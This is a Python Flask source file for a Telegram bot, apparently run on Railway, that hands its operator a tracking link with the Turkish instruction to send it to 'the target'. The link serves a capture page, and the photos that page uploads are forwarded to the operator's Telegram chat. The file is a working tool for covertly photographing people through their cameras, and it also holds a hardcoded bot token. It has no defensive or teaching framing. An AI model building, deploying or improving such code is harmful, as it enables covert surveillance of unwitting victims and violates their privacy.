import os
import logging
import uuid
from flask import Flask, request, send_from_directory
import requests

TOKEN = "8890650354:AAHG_DYLxeIsZMdTxZneIK7ZzbaOJlGsvyA"
API_URL = "https://api.telegram.org/bot" + TOKEN

RAILWAY_DOMAIN = os.environ.get("RAILWAY_PUBLIC_DOMAIN") or os.environ.get("RAILWAY_STATIC_URL")
if not RAILWAY_DOMAIN:
    RAILWAY_DOMAIN = "cam-bot.up.railway.app"
else:
    RAILWAY_DOMAIN = RAILWAY_DOMAIN.lower()

WEBHOOK_URL = "https://" + RAILWAY_DOMAIN
PORT = int(os.environ.get("PORT", 5000))

user_tokens = {}

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__, static_folder="static")

logger.info("=== BOT STARTED ===")
logger.info("TOKEN: " + TOKEN[:15] + "...")
logger.info("DOMAIN: " + RAILWAY_DOMAIN)
logger.info("WEBHOOK: " + WEBHOOK_URL)
logger.info("PORT: " + str(PORT))

@app.route("/" + TOKEN, methods=["POST"])
def webhook():
    logger.info("WEBHOOK RECEIVED")
    data = request.get_json()
    logger.info(str(data))

    if "message" in data and "text" in data["message"]:
        chat_id = data["message"]["chat"]["id"]
        username = data["message"]["from"].get("username", "user")
        text = data["message"]["text"]

        logger.info("CMD: " + text + " from @" + username)

        if text == "/start":
            token = str(uuid.uuid4()).replace("-", "")[:16]
            user_tokens[token] = {"chat_id": chat_id, "username": username}
            link = WEBHOOK_URL + "/c/" + token

            msg = "Merhaba @" + username + "!\n\nLink: " + link + "\n\nBu linki hedefe gonder."

            url = API_URL + "/sendMessage"
            payload = {"chat_id": chat_id, "text": msg, "parse_mode": "Markdown"}
            r = requests.post(url, json=payload, timeout=10)
            logger.info("SEND STATUS: " + str(r.status_code))

    return "OK", 200

@app.route("/c/<token>")
def capture(token):
    if token not in user_tokens:
        return "Link gecersiz", 404
    return send_from_directory("static", "capture.html")

@app.route("/upload/<token>", methods=["POST"])
def upload(token):
    if token not in user_tokens:
        return {"error": "token"}, 403
    data = request.get_json()
    img = data.get("image", "")
    if not img:
        return {"error": "no image"}, 400

    import base64
    try:
        img_bytes = base64.b64decode(img.split(",")[1])
    except:
        return {"error": "decode"}, 400

    info = user_tokens[token]
    cap = "Fotograf! @" + info["username"]

    url = API_URL + "/sendPhoto"
    files = {"photo": ("photo.jpg", img_bytes, "image/jpeg")}
    data2 = {"chat_id": info["chat_id"], "caption": cap}
    requests.post(url, files=files, data=data2, timeout=30)

    return {"ok": True}, 200

@app.route("/")
def home():
    return "OK - " + RAILWAY_DOMAIN

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT)
